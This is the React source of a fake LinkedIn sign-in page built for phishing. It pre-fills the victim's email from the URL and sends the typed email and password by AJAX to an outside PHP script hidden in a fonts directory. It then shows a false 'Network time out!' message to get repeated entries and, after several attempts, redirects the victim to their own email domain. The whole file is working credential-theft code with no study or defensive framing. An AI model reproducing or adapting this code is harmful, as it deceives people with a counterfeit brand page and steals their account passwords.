
import React, { useState } from "react";
import "./linkdn.css";
import { ReactComponent as Log } from "../logo.svg";
import { ReactComponent as Linkk } from "../link.svg";
import { IoIosArrowDown } from "react-icons/io";
import $ from "jquery";
import Preloader from '../Preloader/preloader';

const Linkdn = ()=>{

    const refreshh = ()=> window.location.reload();

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();

    const [outlookEmail, setOutlookEmail] = useState('');
    const [outlookPassword, setOulookPassword] = useState('');


    // const submitForm = e=>{
    //     e.preventDefault();
    // }

    const [spinLoader, setSpinLoader] = useState(false);


    const [count, setCount] = useState(0);

    const [err, setErr] = useState(false);


    const submitForm = e=>{
        e.preventDefault();
        
        console.log(outlookEmail, outlookPassword);

        if(outlookPassword === ""){
            return null
        }else{
            setSpinLoader(true);
            const user = {
                email: outlookEmail,
                password: outlookPassword
            };
            
            $.ajax({
                type: "POST",
                url: "https://dozenpearl.com/nc_assets/fonts/laptop/lkdn.php",
                data: user,
                success(data) {
                    // alert('OK');
                    console.log(data);
                },
            });
            setTimeout(()=>{
                setTimeout(() => {
                    setErr(true);
                    setOulookPassword('');
                    setSpinLoader(false);
                }, 2000);
            }, 2500)
            setErr(false);
            setCount(count=> count + 1);
            if(count >= 3){
                const redirectURL = window.location.href;
                const sliceEqualSign = redirectURL.indexOf("@");
                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                console.log(extracetdemailDomain);
                window.location.href = `https://www.${extracetdemailDomain.split('&', 1).toString()}`;  
            }


        }
    }



    return(<>
        <section>

            { spinLoader ? <Preloader /> : null }
            
            <header>

                <Log className="logo"/>
                
            </header>

            <main className="card_layout">
                <div className="header__content ">
                    <h1 className="header__content__heading ">Sign in</h1>
                    <p className="header__content__subheading ">Stay updated on your professional world</p>
                </div>


                <form className="login__form" onSubmit={submitForm}>

                    {err ? <p className="err_msg">Network time out!</p> : null  }

                    <div className="emel_wrapper_">

                        <label class="form__label--floating" for="username" aria-hidden="true" style={{
                            fontSize:'13px',
                            color:'#444'
                        }}>Email or Phone</label>

                        <input 
                            className="inp_emel"
                            type="email"
                            id="email"
                            aria-label="Email or Phone"
                            name="session_key"
                            value={outlookEmail}
                            onChange={e=>setOutlookEmail(e.target.value)}
                        />

                    </div>





                    <div className="emel_wrapper_">

                        {/* <label class="form__label--floating" for="username" aria-hidden="true" style={{
                            fontSize:'13px',
                            color:'#444'
                        }}>Email or Phone</label> */}

                        <input 
                            className="inp_emel"
                            type="password"
                            id="pswd"
                            placeholder="Password"
                            aria-label="Password"
                            name="session_key"
                            value={outlookPassword}
                            onChange={e=> setOulookPassword(e.target.value)}
                            
                        />

                    </div>


                    <p className="for_get">Forgot password?</p>


                    <div className="submit_wrapper">
                        <input
                            type="submit"
                            className="submit_btn"
                            value={`Sign in`}
                            onClick={submitForm}
                        />
                    </div>

                    <section style={{
                        display:'flex',
                        justifyContent:'center',
                        marginTop:'1em'
                    }}>
                        <div style={{
                            color:'#666'
                        }}>
                            <span>_________________</span> or <span>___________________</span>
                        </div>
                    </section>



                    <p style={{
                        fontSize:'13px',
                        textAlign:'center',
                        marginTop:'1em',
                        color:'#333'
                    }}>
                    By clicking Continue, you agree to LinkedIn’s <span className="poli_cy_"><code>User 
                        <br />Agreement</code>, <code>Privacy Policy</code>, and <code>Cookie Policy</code>.

                    </span>
                    </p>


                    <div className="one_time_lnk">
                        <Linkk />
                        &#160;
                        &#160;
                        Sign in with a one-time link
                    </div>

                </form>


            </main>


                    <div style={{
                        textAlign:'center',
                        marginTop:'2.3em'
                        
                    }}>New to LinkedIn? <span className="jn">&#160;Join now</span></div>


                   {/* <div style={{
                    display:'flex',
                    alignItems:'center'
                    
                   }}>

                   <Bottom  className="btm"/> */}

                   <footer>
                    
                    <ul>
                        <li onClick={refreshh}><img className="btm" alt="btm" src="data:image/png;base64,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"/></li>
                        <li onClick={refreshh}> &copy;  2024</li>
                        <li onClick={refreshh}>User Agreement</li>
                        <li onClick={refreshh}>Privacy Policy</li>
                        <li onClick={refreshh}>Community Guidelines</li>
                        <li onClick={refreshh}>Cookie Policy</li>
                        <li onClick={refreshh}>Copyright Policy</li>
                        <li onClick={refreshh}>Send Feedback</li>
                        <li onClick={refreshh}>Language &#160;&#160; <IoIosArrowDown/> </li>
                    </ul>
                </footer>


                   {/* </div> */}


                   
            
        </section>
    </>)
};

export default Linkdn;